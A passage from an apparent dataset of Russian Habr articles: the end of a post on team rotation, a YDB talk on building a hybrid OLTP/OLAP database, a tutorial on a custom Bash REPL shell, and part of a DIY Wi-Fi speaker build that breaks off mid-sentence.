Разобраться с будущей командой:уточнить состав: кого планируют увольнять, нужен ли найм;понять зоны роста сотрудников и какие Action Items уже определены;оценить техническое состояние сервисов: состояние критических сценариев, частота деградаций;изучить бэклог: на какой срок составлен и насколько он детализирован;узнать о технической стратегии и процессах (наличие дашбордов, ключевых метрик по типу ТММ и далее по списку).4. Зафиксировать ожидания у нового руководителя:открыто обсудить, какие ожидания есть ко мне и как они повлияют на мою оценку в будущем ревью.ИтогРотация — это не просто переход между командами, а полноценная смена работы. К тебе будут относиться как к новичку и в каком-то смысле твоя внутренняя карьера «откатится» назад. Однако, если ротация проходит внутри одной вертикали или департамента, твои заслуги сохраняются.Сам по себе процесс ротации не так уж и страшен: я успел поработать в двух вертикалях, внутренних и горизонтальных проектах. Довольно сильно расширил свой кругозор, собрав опыт разных команд и могу теперь увереннее чувствовать себя в любой технической ситуации. Главный вывод, который я сделал: чем лучше подготовиться к ротации, тем больше шансов на то, что ожидания совпадут с реальностью. Важно заранее знать все подводные камни, иначе тебя могут ждать вызовы, которых ты не ожидал. Спасибо за уделенное статье время! Надеюсь, мой опыт вам пригодится.А был ли у вас опыт ротации? Какие впечатления остались? Что было классно, а что не понравилось? Делитесь историями в комментах!Кликни здесь и узнаешьПодробнее о том, какие задачи решают инженеры Авито, — на нашем сайте и в телеграм-канале AvitoTech. А вот здесь — свежие вакансии в нашу команду.  "
84,"Почему сложно разработать OLAP-базу данных, если у тебя уже есть OLTP",YDB,Компания,0,Программное обеспечение,2025-04-09,"Это адаптированная для Хабра расшифровка доклада Алексея Дмитриева, директора аналитической платформы YDB DWH, которую создаёт команда Yandex Cloud, — компонента нашей гибридной базы данных YDB для обработки аналитических нагрузок. Когда проект только начинался, у нас было много наработок, которые мы успешно переиспользовали в других проектах. Но оказалось, что OLAP‑нагрузка так сильно отличается от OLTP, что за три года пришлось практически написать по ещё одной реализации многих частей системы. Под катом история о том, почему на рынке так мало гибридных баз данных класса Hybrid Transactional and Analytical Processing (HTAP) и какие сложности стоят на пути их разработки.Мы в Яндексе начали разработку базы данных YDB более десяти лет назад, чтобы дать пользователям гарантии строгой согласованности на наших больших нагрузках. Кластера YDB являются мультитенантными и могут обслуживать тысячи независимых баз данных, каждая из которых может содержать петабайты данных и обрабатывать миллионы запросов в секунду. У нас много кластеров YDB разных размеров для различных целей. Основной кластер обслуживают тысячи серверов, и суммарный объём хранимых в нём данных приближается к экзабайту.Архитектурно база данных разделена на два слоя: хранения и вычисления. Слой хранения отвечает за надёжное и распределённое размещение данных. А слой вычисления делает всё остальное: выполняет над данными запросы, балансирует нагрузку в кластере, предоставляет сервисные функции для управления кластером. Посмотрев на иллюстрацию выше, вы можете заметить такое интересное слово как Tablet или, на нашем сленге, «таблетка».Таблетки — это специальные компоненты YDB, хранящие часть данных таблицы (таблица — table, часть таблицы — tablet, таблетка). К примеру, если в таблице 100 миллионов строк и эту таблицу обслуживает 100 таблеток, то каждая из них будет работать со своим собственным подмножеством строк, примерно по одному миллиону. YDB динамически подстраивает количество обслуживающих таблицу таблеток в зависимости от текущей нагрузки на неё и объёма данных.Таблетки работают по принципу Replicated State Machine (RSM). У каждой таблетки есть текущее состояние и очередь команд, из которой таблетка транзакционно забирает очередную команду, выполняет её и транзакционно сохраняет новое состояние в слой хранения. Выполняя команду, таблетка может не только читать, обрабатывать и сохранять данные но и, например, отправлять сообщения другим таблеткам.RSM хорошо подходит для создания отказоустойчивых систем: если сервер вышел из строя, то достаточно пересоздать таблетку на новом месте, подключить к слою хранения и очереди команд — и таблетка восстановит своё состояние со слоя хранения и продолжит работать с того же места, где была прервана её работа. Такая архитектура позволяет процессам YDB оперировать сотнями тысяч легковесных таблеток, которые обмениваются сообщениями друг с другом.Таблетки обеспечивают не только отказоустойчивость, но и масштабируемость с помощью шардирования. Когда запросов к данным становится много и таблетка понимает, что не справляется со своей частью данных, то она разделяется. Например, была одна таблетка на миллион записей. Это слишком много данных для обработки в один поток. И таблетка разделилась на две по 500 тысяч в каждой. Не хватило — разделилась на четыре по 250 тысяч. После разделения обе таблетки смогут выполняться параллельно: на одном физическом сервере или на разных. А если нагрузки или данных стало меньше, то таблетки начинают снова объединяться в более крупные.Пока компания маленькая, с аналитическими задачами можно справляться не совсем подходящими инструментами вроде OLTP баз данных. Но по мере роста бизнес понимает, что смог накопить много данных, а как их анализировать — непонятно, так как транзакционные базы данных просто не предназначены для аналитики на больших объёмах данных. И тут на помощь приходят аналитические базы данных и аналитические запросы.Перед тем, как начать модифицировать YDB для поддержки и ускорения аналитических запросов, команды Яндекса изучили довольно много опенсорс‑решений. Но они либо не работали на наших масштабах, либо у команд уже был негативный опыт с ними. А ещё у любой отдельной аналитической базы данных был врождённый недостаток: в неё нужно было переносить наши 500 терабайт и как‑то обеспечивать копирование новых данных на скорости в пару миллионов RPS. Решаемая, но нетривиальная задача.Поэтому мы приняли решение взять нашу базу данных YDB и начать превращать её в базу данных для обоих типов нагрузок: OLTP и OLAP. Такие базы данных называют Hybrid Transaction and Analytical Processing (HTAP). Термин придумали в компании Gartner, когда в 2014 году описывали тренды баз данных. Десять лет назад они написали, что в светлом будущем на смену отдельным транзакционным и аналитическим системам придут гибридные решения. Чудес не бывает, и пока не научились делать всё в одной системе. Под капотом гибридных баз данных находятся по сути две разные базы, каждая со своим форматом хранения данных и движком запросов. Разработчики стремятся к тому, чтобы обе базы гарантированно содержали транзакционно одни и те же данные. А дальше в дело вступает оптимизатор: если запрос похож на транзакционный, то оптимизатор мог бы выполнять его в транзакционной части базы, а если аналитический — то в аналитической. Оптимизатор мог бы даже разбить запрос на OLTP‑ и OLAP‑части, выполнить их по отдельности и объединить результат. И чтобы это всё работало, нужна транзакционная согласованность данных, которой довольно сложно добиться. Когда начинаешь строить HTAP базу данных, то сталкиваешься с очень интересной дилеммой. Самый простой способ обеспечить согласованность данных — это сложить транзакционные и аналитические данные в одну базу данных. В таком случае данные моментально доступны и для транзакционной, и для аналитической обработки и не нужно ждать синхронизации. Но есть нюанс. Аналитические запросы очень прожорливы по процессору и легко вытесняют транзакционные запросы, которые выполняются на том же сервере. Самый простой способ справиться с этой проблемой — правильно, разнести транзакционные и аналитические данные на разные сервера. И в этот момент появляются задержки, ведь данные приходится передавать по сети между серверами. Иллюстрацию выше даже не пришлось переделывать: я взял её из презентации, которая была на SIGMOD в 2022 году. И ещё одна иллюстрация, которую я тоже позаимствовал с SIGMOD из презентации TiDB. Маленький кораблик транзакционной нагрузки и девятый вал аналитической иллюстрируют, как именно аналитическая нагрузка влияет на транзакционную. Их тяжело совмещать. На SIGMOD рассказывали про семь видов HTAP баз данных. Четыре основных и три экзотических.Первые гибридные решения были предложены коммерческими базами данных: SQL Server и Oracle. Данные для аналитики просто держались в памяти того же сервера. У такого подхода есть две проблемы. Во‑первых, проблема с изоляцией транзакционных и аналитических запросов: тяжёлая аналитическая нагрузка мешала транзакционной. Во‑вторых, проблема с масштабированием: в те времена память для серверов была дорогая и максимальный её объём ограничивался возможностями одного сервера.После того, как Sun купила MySQL, а Oracle купила Sun, появился второй вариант. Рядом с транзакционной базой данных устанавливался большой In‑memory кластер, в котором считались аналитические запросы. Взаимовлияние двух отдельных систем получалось минимальным, но за него пришлось заплатить задержками в передаче данных между системами. И ещё заплатить масштабированием, потому что память стоит дорого.Интересный момент, что относительно современные системы, такие как Snowflake и SAP HANA, подходили к вопросу с другой стороны. К изначально аналитическим системам добавляли расширения для OLTP. Но изоляция нагрузки в таких решениях не была высокой, и девятый вал аналитики всё так же смывает транзакционную нагрузку.Последний основной вариант — когда есть изначально распределённая транзакционная система и рядом строится вторая такая же, но аналитическая. Обе системы получаются изолированными друг от друга и хорошо масштабируемыми. Но задержка на синхронизацию данных между ними будет самая высокая из всех вариантов: транзакционно собрать данные с двух тысяч серверов и перенести их на четыре тысячи серверов занимает время. Первопроходцем здесь оказался Google, вслед за ним пошли разработчики TiDB, и, посмотрев, как у них получается, мы тоже решили пойти этим путём.При разработке таких баз данных нужно ответить на четыре основных архитектурных вопроса:Как эффективно хранить транзакционные и аналитические данные? Использовать одинаковую структуру хранения или разную?Как передавать данные между транзакционным и аналитическим хранилищем?Как оптимизировать запросы, которые устроены очень по‑разному для OLTP‑ и OLAP‑нагрузок?Как выделять мощности под разные типы нагрузок, чтобы они меньше влияли друг на друга?Организация хранения данныхВ этой статье я рассказываю про три вопроса из четырёх: как гибридные базы хранят данные и почему тяжело сделать универсальное хранилище, как запросы оптимизируются и как системы планирования выделяют ресурсы для выполнения запросов. Все современные системы пришли к тому, что случайный доступ к данным — это дорого. Поэтому для хранения используются LSM‑деревья или B+‑деревья. Основная идея в том, что вместо изменения существующих данных в файл дописываются новые данные. А когда файл становится достаточно большим, то создаётся следующий файл и новые данные продолжают дописываться в него.При таком подходе данные дублируются, одни и те же ключи находятся в разных файлах и дубликаты занимают много места. Поэтому база данных использует фоновые compaction‑процессы, которые перемалывают данные в файлах и дедуплицируют их, убирают помеченное удалённым и т. п. Для LSM‑деревьев существуют два классических подхода к compaction. Если мы хотим очень быстро писать данные и готовы жертвовать чтением и местом, то используется Size tiered compaction. У нас будут пересекающиеся диапазоны, гигантские файлы, но писать в них мы будем очень быстро. Если же мы хотим быстро читать данные, то используется Leveled compaction: постоянное удаление лишнего замедляет запись, но в каждом файле формируются компактные, оптимальные для чтения структуры данных.Изначально делая OLTP‑систему в YDB, мы приняли решение, что для нас важна скорость записи, поэтому пошли по пути Size tiered compaction. В случае транзакционной нагрузки наши пользователи пишут гораздо больше данных, чем читают уже записанных. С OLAP всё по‑другому. Данные зачастую один раз заливаются, и затем их надо читать в огромных объёмах для выполнения аналитических запросов. Так как данных много, то мы не можем позволить себе дублирование, поэтому для хранения OLAP‑данных мы используем Leveled compaction. А так как нам нужно поддерживать OLTP‑ и OLAP‑нагрузки, нам приходится иметь реализацию одновременно и Size tiered, и Leveled compaction. Транзакционные и аналитические запросы различаются не только в физическом хранении данных, но и в их логической организации. OLTP‑запросы обычно приходят большим потоком, но каждый работает с небольшими диапазонами ключей. Для каждого такого запроса базе данных несложно найти нужную таблетку или несколько, сервер, где они сейчас исполняются, и внести изменения. В случае с OLAP ситуация меняется. Запросы менее частые, но многие зачастую сканируют очень большие объёмы данных, сотни гигабайт, если не больше. Данные должны быть максимально равномерно распределены по кластеру, чтобы обрабатываться параллельно для скорейшего получения результата. Поэтому в распределённых OLAP‑системах используется шардирование по хэшам, которое обеспечивает именно такое распределение данных. Подводя итог: OLAP‑ и OLTP‑системы имеют совершенно разные сценарии использования. Данные в них хранятся по‑разному и на физическом, и на логическом уровне. Оптимизация запросовВторая часть моей статьи связана с оптимизацией запросов. Те, кто работал с банковскими системами, знают, что когда происходит закрытие квартала, на счёт Налоговой начинают приходить деньги от огромного числа людей. Для того, чтобы выдерживать нагрузку в десятки тысяч RPS на один ключ, время исполнения запроса в ядре базы данных должно составлять десятки микросекунд. Иначе начнёт накапливаться задержка.А вот аналитические запросы могут выполняться десятки секунд или даже минут. Поэтому мы можем потратить некоторое время и подготовиться к выполнению такого запроса. Все в каком‑то виде это делают: например, Amazon генерирует C++ код запроса и компилирует его с помощью GCC. А мы используем промежуточное представление и компилятор LLVM.Компиляция запроса в машинный код может занять несколько секунд. Для транзакционных запросов, когда время выполнения составляет десятки микросекунд, а запросы повторяются редко, компилировать невыгодно. Запрос будет компилироваться гораздо дольше, чем затем выполняться скомпилированный код. А вот в случае аналитической нагрузки всё снова наоборот. Запросы выполняются десятки секунд над огромными объёмами данных, поэтому база данных выигрывает от компиляции. Для OLAP‑нагрузок часто используется LLVM‑компиляция и разные варианты оптимизации. Например, можно скомпилировать не весь запрос, а только его часть.Во многих запросах есть фильтры, которые мы описываем с помощью SQL‑конструкции WHERE. Если читать со слоя хранения только удовлетворяющие фильтру строки, то можно очень сильно сэкономить на объёме читаемых данных и скорости их обработки. Такая оптимизация называется «pushdown предикатов»: передача предикатов вниз, в систему хранения (pushdown).Так как таблетки YDB однопоточные, а запросов приходит тысячи в секунду, то исполнение в них фильтров к данным заставит слой вычисления ждать. Поэтому для OLTP‑запросов выгодно максимально быстро получить относительно небольшой объём данных совсем без фильтров, а применить фильтры к этим данным уже в распределённом слое вычислений. А для OLAP снова всё наоборот. Чем эффективнее применены фильтры при считывании данных, тем меньше данных (а данных очень много) придётся поднимать со слоя хранения в слой вычислений. Поэтому в OLAP‑базах так распространён pushdown фильтров и предикатов.OLAP‑запросы эффективно выполнять с помощью векторных вычислений, когда одна инструкция процессора совершает несколько операций сразу над несколькими идущими подряд байтами в памяти. Для этого данные в памяти должны быть выровнены определённым образом, а выравнивать сотни гигабайт для каждого запроса очень накладно. Поэтому наш слой хранения держит данные ровно в том формате, в каком они будут обрабатываться в памяти. Это позволяет при чтении сразу размещать их в памяти в выровненном состоянии без дополнительных преобразований. Про pushdown предикатов стоит рассказать подробнее. Чтобы узлы хранения могли вернуть только те данные, которые нам нужны, используется SSA‑программа (Single Static Assignment). Так делаем мы, так делают разработчики ClickHouse и большинства компиляторов.Как подсказывает название, в SSA‑программе каждая переменная может быть использована только один раз. Для такого кода очень легко понять, какие части можно выполнять параллельно, а какие нет. В примере выше все части, связанные с фильтрацией, могут быть выполнены параллельно. Результатом выполнения SSA‑программы являются колонки. Это логично, так как именно колонки находятся в слое хранения, их можно обрабатывать большими массивами с помощью векторных вычислений и получать на выходе такие же колонки. Если данные не попадают под условия WHERE, то их не нужно передавать дальше. Наша SSA‑программа не может удалить данные, но может на основе условий создать новую временную битовую колонку, которая будет определять, что данные передавать не нужно. И мы, и ClickHouse в этом плане двигаемся в одном направлении. Мы оперируем готовыми блоками SSA‑выражений. Начиная от простых, которые хорошо ложатся на машинный код, и заканчивая сложными, такими как регулярные выражения и математические функции. При выполнении SSA‑кода загруженные в память колонки не меняются. Вместо этого для каждого шага создаются новые, временные колонки. Которые существуют только на время вычислений и удаляются после получения результата. Не все предикаты, которые хочется отправить на слой хранения, можно туда отправить. Синтетический пример — «текущее время». Если на каждом сервере слой хранения применит «текущее время» как фильтр, то это время будет немного отличаться и в результате получится неконсистентный результат. После применения таких оптимизаций, как векторные вычисления, и pushdown предикатов у нас получилось ускориться втрое. Это можно увидеть на иллюстрации выше, где используется тест ClickBench, в котором порядка 100 миллиардов строк. Девятый вал аналитической нагрузки может вытеснить транзакционную, даже если вы корректно всё разложили по потокам. Просто за счёт физических свойств процессора, где есть общая шина памяти и диска. OLTP‑запросы оптимизированы на микросекундное выполнение, в то время как OLAP оперируют с огромными массивами и используют все ресурсы серверов, поэтому в обоих случаях нужно планировать доступные вычислительные ресурсы и управлять ими.Планирование ресурсов и управление имиВ завершение своей статьи хочу рассказать про управление ресурсами. В случае OLTP у системы миллисекунды на всё, и поэтому она оптимистично пытается выполнить запрос на том же узле, на который этот запрос отправил клиент. Каждый OLTP‑запрос обычно потребляет небольшое количество ресурсов, и шансы, что ресурсов хватит, велики. Ну а если не угадали, то просто получим чуть большую задержку, чем обычно. С OLAP снова всё не так. Запросы потребляют очень много ресурсов, включая самый дорогой — память. Поэтому стоимостной оптимизатор YDB делит запрос на части и оценивает, сколько ресурсов нужно на каждом этапе выполнения. После чего уже раскладывает запрос по кластеру, исходя из доступных ресурсов. Если не угадали, то приходится использовать спиллинг данных на диски и сложные штуки, связанные с нехваткой ресурсов. Даже с точки зрения физического размещения ресурсов в кластере ситуации очень разные. В случае OLTP‑нагрузки нам важно, чтобы когда запрос пришёл в таблетку, которая является единицей исполнения, она могла сразу же его выполнить. Поэтому мы считаем мощность каждого сервера и прицельно размещаем по ним нужные таблетки. С OLAP нужна максимальная параллельность выполнения запроса: чем больше серверов выполняют один аналитический запрос, тем быстрее он будет выполнен. Поэтому таблетки должны быть разложены по серверам максимально равномерно. Если на каком‑то сервере окажутся две таблетки, то нужно будет по очереди ждать выполнения на обеих, фактически увеличив время выполнения запроса в два раза. В итоге, база данных очень по‑разному планирует ресурсы для OLTP и OLAP. Для транзакционных запросов база оптимистично считает, что ресурсов хватит. Большую часть времени так и происходит. Для аналитических запросов проводится оценка мощности и размещения, YDB может даже отправить такой запрос в очередь, если посчитает, что кластер слишком занят, а запрос может и подождать. Выученные урокиНачав разрабатывать поддержку OLAP‑запросов в базе данных, мы стали очень хорошо понимать, почему баз, умеющих выполнять OLTP‑ и OLAP‑запросы, немного. OLTP‑ и OLAP‑системы совершенно по‑разному хранят данные. По‑разному оптимизируются запросы. И даже управление ресурсами так сильно различается.Фактически это приводит к тому, что для решения таких задач разработчики создают две разные базы данных, потому что данные нужно хранить, передавать, обрабатывать и планировать по‑разному. Создание HTAP‑систем — это не цель, а путь. Стоимостной оптимизатор в таких базах данных очень интересен, и у нас есть множество идей по его улучшению. Например, при планировании запросов можно учитывать, что у нас по факту две базы, между которыми налажена передача данных с задержкой. Если данные ещё не переданы в OLAP‑систему, значит часть запроса для таких данных нужно выполнять в OLTP. А ещё можно учитывать сбои в передаче данных!Вторая важная задача — это размещение обоих кластеров на одних и тех же серверах. У нас есть примерное понимание, как это сделать, но объём работы огромный, и мы готовы к тому, что будут сложности.На этом я завершаю свой рассказ и готов обсудить с вами в комментариях разработку баз данных вообще и HTAP‑систем в частности. Наши разработки выложены в опенсорс, есть коммерческая сборка с открытым ядром, и всё, о чём я рассказал выше, вы можете попробовать сами прямо сейчас. А ещё у нас есть Телеграм‑канал, где мы рассказываем про YDB и другие наши разработки. Присоединяйтесь к нашим сообществам!https://github.com/ydb-platformhttps://t.me/cloud_trackВсё о коммерческой сборке для корпоративного использования тут:https://ydb.yandex.ru/https://t.me/ydb_ru"
85,"Кастомный шелл на bash: мини-интерпретатор с поддержкой pipe, history и alias",OTUS,Цифровые навыки от ведущих экспертов,0,"Консалтинг и поддержка, Рекрутинг и HR, Производство мультимедиа-контента",2025-04-09,"Привет, Хабр!Сегодня рассмотрим, как на базе Bash собрать свой собственный кастомный шелл — с автодополнением, историей, алиасами, логами, цветным prompt'ом, подсказками по sudo и возможностью расширения. Минимальный REPL-интерпретатор на BashНачнём с базовой конструкции, которая делает из bash-а простой цикл чтения и выполнения команд:#!/usr/bin/env bash  HISTORY_FILE=""$HOME/.mybash_history"" touch ""$HISTORY_FILE""  trap ""echo; exit 0"" SIGINT SIGTERM  while true; do     read -e -p ""→ "" CMD     echo ""$CMD"" >> ""$HISTORY_FILE""     eval ""$CMD"" doneHISTORY_FILE — файл для сохранения истории между сессиями, trap — ловим Ctrl+C и красиво выходим, read -e — включает поддержку стрелок и автодополнения, eval ""$CMD"" — исполняем введённую строку как Bash-команду.  Поддержка алиасовДобавим свои алиасы и включим их поддержку:shopt -s expand_aliases alias ll='ls -la' alias gs='git status'shopt -s expand_aliases — без него alias'ы в скрипте не работают. Дальше можно объявлять любые свои сокращения.Добавим логирование командХотим знать, кто и когда запускал какую команду:LOGFILE=""$HOME/.mybash_cmd.log"" log_command() {     echo ""$(date ""+%Y-%m-%d %H:%M:%S"") | $1"" >> ""$LOGFILE"" }log_command — простая функция, логирующая команду с временной меткой.Используем её в цикле:read -e -p ""→ "" CMD log_command ""$CMD"" eval ""$CMD""Измерение времени выполнения командыВариант с миллисекундами:start=$(date +%s%3N) eval ""$CMD"" end=$(date +%s%3N) echo ""Команда выполнена за $((end - start)) мс""date +%s%3N — время в миллисекундах. Считаем разницу до и после выполнения команды.Подсказка на sudo при ошибке доступаif eval ""$CMD"" 2>&1 | grep -iq ""permission denied\|operation not permitted""; then     echo ""Возможно, стоит попробовать: sudo $CMD"" fi2>&1 — захватываем stderr. grep -iq — проверяем сообщение об ошибке доступа, не учитывая регистр.Цветной promptПример синим цветом:read -e -p $'\e[1;34m→\e[0m ' CMD\e[1;34m — включаем синий цвет. \e[0m — сбрасываем в стандартный после символа prompt-а.Лог piped-командif [[ ""$CMD"" == *""|""* ]]; then     echo ""PIPE: $CMD"" >> ~/.mybash_pipe.log fiПростая проверка на наличие pipe в команде и логирование её отдельно.Используем PROMPT_COMMAND для хуковexport PROMPT_COMMAND='echo ""[Hook] Снова в prompt-е""'PROMPT_COMMAND — переменная, в которую можно вписать команду, исполняемую до показа prompt'а. Подходит для логов, счётчиков, метрик и вообще чего угодно.Собираем всё воедино — финальный скрипт#!/usr/bin/env bash  shopt -s expand_aliases alias ll='ls -la' alias gs='git status'  HISTORY_FILE=""$HOME/.mybash_history"" LOGFILE=""$HOME/.mybash_cmd.log"" PIPELOG=""$HOME/.mybash_pipe.log"" touch ""$HISTORY_FILE"" ""$LOGFILE"" ""$PIPELOG""  trap ""echo; exit 0"" SIGINT SIGTERM  log_command() {     echo ""$(date ""+%Y-%m-%d %H:%M:%S"") | $1"" >> ""$LOGFILE"" }  while true; do     read -e -p $'\e[1;34m→\e[0m ' CMD     echo ""$CMD"" >> ""$HISTORY_FILE""     log_command ""$CMD""      if [[ ""$CMD"" == *""|""* ]]; then         echo ""PIPE: $CMD"" >> ""$PIPELOG""     fi      start=$(date +%s%3N)     if ! eval ""$CMD"" 2> >(tee /tmp/mybash_err.log >&2); then         if grep -iq ""permission denied\|operation not permitted"" /tmp/mybash_err.log; then             echo ""Возможно, стоит попробовать: sudo $CMD""         fi     fi     end=$(date +%s%3N)     echo ""Команда выполнена за $((end - start)) мс"" doneЭто уже вполне себе рабочая мини-оболочка, которая аккуратно собирает всё, что мы настроили раньше: автодополнение через read -e, история команд, которая не исчезает между сессиями, alias'ы как в нормальном shell'е, логирование всего подряд (включая пайпы), замеры времени выполнения и подсказки на тему «а не забыли ли вы sudo?». Всё это живёт в бесконечном цикле, превращая обычный bash-процесс в кастомизированный REPL, который реагирует на команды и делает это чуть умнее, чем дефолтный bash.Что можно докрутить  Интеграция с gh, kubectl, helm и прочими DevOps-инструментамиСовременные DevOps-интерфейсы — это, по сути, API-обёртки, которые отлично дружат с Bash. Можно превратить шелл в DevX-инструмент, просто завернув часто используемые вызовы в alias или функцию.Примеры:alias pr='gh pr list --limit 10' alias logs='kubectl logs -f $(kubectl get pods | fzf)' alias helmstatus='helm list --all-namespaces'Или завести функции с аргументами:ghissue() {   gh issue list --label ""$1"" --limit 5 }Добавляем это в начало скрипта или подгружай через отдельный конфиг.Поддержка JSON-вывода и jqПочти все современные CLI-утилиты (docker, gh, kubectl, aws, gcloud) отдают данные в JSON. А jq — это grep/awk для JSON.Примеры alias:alias pods='kubectl get pods -o json | jq "".items[].metadata.name""' alias ghactions='gh api repos/:owner/:repo/actions/runs | jq "".workflow_runs[].status""' alias docker_ports='docker inspect $(docker ps -q) | jq \"".. | .HostPort? // empty\""'Можно даже динамически строить меню с select, fzf, gum, whiptail.Запуск в Docker (изолированная среда + CI/CD)Хочешь свой REPL внутри контейнера — для обучения, деплой-скриптов или как среду в CI?Создай Dockerfile:FROM bash:5.2 COPY mybash.sh /mybash.sh RUN chmod +x /mybash.sh CMD [\""/mybash.sh\""]Собери и запусти:docker build -t my-bash-repl . docker run -it my-bash-replТеперь есть shell-движок в изолированной капсуле.А вам приходилось делать что-то подобное? Делитесь в комментарияхСтатья подготовлена в преддверии старта специализации ""Administrator Linux"". На странице специализации можно ознакомиться с подробной программой, а также посмотреть записи открытых уроков.А в календаре мероприятий уже доступно расписание всех открытых уроков."
86,"Hi-Fi с Wi-Fi. Часть вторая: хочется помощнее, ватт на сто",Timeweb Cloud,То самое облако,0,Связь и телекоммуникации,2025-04-09,"Привет, Хабр!В прошлой статье я делился опытом создания портативной мини-акустики с передачей аудио по Wi-Fi вместо Bluetooth. В этой — представляю её более мощную версию. Мы напечатаем корпус, усовершенствуем скрипты, разработаем фирменное приложение для Hi-Fi трансляции звука и добавим эквалайзер в систему. ❯ Вместо начала«Поигравшись» со своим предыдущим проектом, я был настолько воодушевлен, что мне захотелось сделать что-то большее как в аппаратном плане, так и в программном. В итоге было решено собрать более мощную портативную Wi-Fi акустику с интересным дизайном и отличными характеристиками. Для передачи аудио мы будем использовать те же стандарты (технологии), что были описаны в предыдущей статье, но с некоторыми дополнениями.  В результате обдумывания будущего DIY изделия, у меня сформировалось следующее подобие технического задания:Реализация акустики со следующими параметрами:Мощность акустической системы: 50 Вт на канал;Тип акустического оформления: пассивный излучатель;Диапазон воспроизводимых частот (минимум): 35-18 000 Гц;Тип применяемых динамических головок: широкополосные, 100 мм;Физические элементы управления: копка со светодиодным индикатором без фиксации; Питание: питание акустики выполнить с помощью встроенного аккумулятора 21 В (Li-ion 5S), зарядку и питание обеспечить с помощью разъема USB Type-C с технологией Power Delivery (PD) 120W 20V; Клиентское программное обеспечение: для трансляции аудио разработать мобильное приложение с элементами управления параметрами акустической системы. Что касается физических элементов управления на акустической системе — я сторонник минимализма и искренне не понимаю, зачем в наш современный цифровой век производители портативной акустики зачастую превращают панель в пульт управления атомной станции, добавляя различные крутилки и кнопочки. Ведь всё управление можно реализовать в мобильном приложении, ведь более рационально выполнять регулировку из точки прослушивания, чем каждый раз подходя к устройству.❯ Корпус акустикиКорпус акустики проектировался с учетом своего предыдущего (студенческого) опыта проектирования и сборки акустических систем (и усилителей). Как обычно, разработка выполнялась в свободной САПР FreeCAD. Ниже представлены скриншоты разработанной модели.Скриншоты модели корпуса По существу, корпус акустики состоит из двух блоков, скреплённых перемычками, в пространстве между которыми реализована система для размещения электроники. Дизайн корпуса выбран не случайно — это моя дань прошлому. При проектировании я вдохновлялся магнитофоном «Романтик М-309 С», с которым провёл немало времени в детстве.   С тыльной стороны размещены пассивные излучатели, которые обеспечивают дополнительную излучающую поверхность, что обеспечивает отличное качество воспроизведения низких частот. Также спроектированы боковые панели с необходимыми элементами для размещения дисплея и разъема. Для улучшения стереобазы, корпус спроектирован так, чтобы динамические головки были повернуты в стороны от центра на небольшой угол.❯ 3D печатьЯ часто слышу утверждение, что пластик — худший материал для изготовления акустики. В некоторых случаях это верно, но, как сказал бы Альф: «Вы просто не умеете их готовить». Если изготавливать корпус из пластика методом литья, то да, акустические свойства корпуса могут быть хуже, чем у деревянных. Но тут нам на помощь приходит 3D-принтер, который позволяет менять рисунок и плотность заполнения стенок корпуса — что недостижимо при литье. Работая с 3D-печатью, я давно заметил, что изменение плотности заполнения влияет на акустические свойства. Для печати моделей я применяю HIPS пластик — это идеальный вариант для печати корпусов акустических систем, благодаря своим свойствам. Ниже представлен скриншот слайсера с отображением модели корпуса. Степень заполнения стенки 65%, рисунок «сетка» и толщина слоя 0,4 мм. Изображение сеткиНесмотря на то, что HIPS пластик менее подвержен расслоению при печати, я рекомендую выполнять печать в закрытой термокамере и после завершения печати дождаться полного остывания, прежде чем доставать модель из принтера. Я из-за своей нетерпеливости получил пару небольших трещин, которые вы можете наблюдать далее на готовом корпусе, но, к счастью, данные дефекты легко исправляются с помощью паяльника.❯ Электроника В конструкции нашей портативной акустики применяются относительно недорогие компоненты, иначе всякий смысл в DIY пропадает.▨ Вычислительная платформа «Мозг» устройства переезжает из предыдущего проекта (одноплатник Mango Pi MQ-Quad) — он выполняет роль вычислительной системы. В качестве источника аналогового аудио сигнала будет использоваться встроенный ЦАП, его характеристики меня полностью устраивают.▨ Усилитель мощности В качестве усилителя я выбрал компактный модуль XH-M562 на базе чипа TPA3116d2. Эта микросхема представляет собой высококачественный УМЗЧ класса D с двумя каналами по 50 Вт и поддержкой работы на несущей частоте 1,2 МГц.Модуль XH-M562 TPA3116d2Этот модуль был заказан на всем известном оранжевом маркетплейсе. После двух недель ожидания, модуль наконец-то у меня. Первое включение и тест усилителя меня очень разочаровал, качество звука было ужасное: практически полностью отсутствовали низкие частоты и выходная мощность составляла не более 20 Вт на канал, при питании 21 В. Китайские инженеры опять что-то намудрили, поэтому пришлось воспользоваться даташитом, чтобы довести усилитель до адекватных параметров. Изучая документацию на микросхему, я обратил внимание на следующий таблицы:Конфигурация режима усиленияКонфигурация входных цепейСравнив данные параметры с номиналами установленных компонентов, были обнаружены следующие причины плохого качества звучания:Входные резисторы R5 и R6 имеют номинал 1 кОм, что вносит значительные искажения в входной сигнал.  Входные конденсаторы C10, C9, C7, C6 имеют номинал 1 мкФ, хотя в датащите  четко написано:  «Если требуется ровный басовый отклик вплоть до 20 Гц, рекомендуемая частота среза составляет одну десятую от этого, 2 Гц. В таблице 2 перечислены рекомендуемые конденсаторы связи по переменному току для каждого шага усиления.»Резисторы R3 и R2, которые отвечают за настройку уровня усиления, имеют номиналы 20 кОм и 100 кОм — что устанавливает режим усиления на 26 dB, но при этом, номинал входных сопротивление должен соответствовать 30 кОм, вместо установленных 1 кОм. Решение проблемы: Входные конденсаторы C10, C9, C7 и C6 были заменены на 10 мкФ. Согласно таблице 2 даташита, входные резисторы R5 и R6 заменены на 9 кОм. Для установки коэффициента усиления 36 дБ резисторы R3 и R2 были заменены на 47 кОм и 75 кОм соответственно.После проделанной операции, усилитель заиграл новыми красками! Теперь я доволен качеством звучания. Видимо китайские инженеры сознательно исказили параметры усилителя, чтобы он мог выжить в неумелых руках, так как он поставляется без радиатора и конструкция платы затрудняет его установку из-за торчащих конденсаторов (С4, С5, С3, С2, С16, С17, С18, С19). В нашем режиме установка радиатора обязательна, так как при воспроизведении низких частот микросхема имеет неплохой нагрев. Для установки радиатора необходимо демонтировать конденсаторы С4, С5, С3, С2, С16, С17, С18, С19 и заменить их на электролитические буферные ёмкости с номиналом 2200 мкФ 25 В, к счастью, на плате уже для них предусмотрены контактные площадки. ▨ Система питанияЧтобы раскрыть весь потенциал усилителя, было принято решение использовать уровень питающего напряжения 21 В. Данный уровень позволяет реализовать питание акустики как от зарядного устройства с PD 120W, так и от встроенного аккумулятора. А так как напряжение питания нашей Mango Pi MQ-Quad составляет 5 В, то необходимо реализовать и понижающий преобразователь до указанного уровня. Учитывая данные потребности, был разработан модуль управления питанием, схема которого показана ниже:Схема модуля управления питаниемПонижение уровня напряжения для питания одноплатника реализовано на популярной микросхеме LM2595-ADJ, 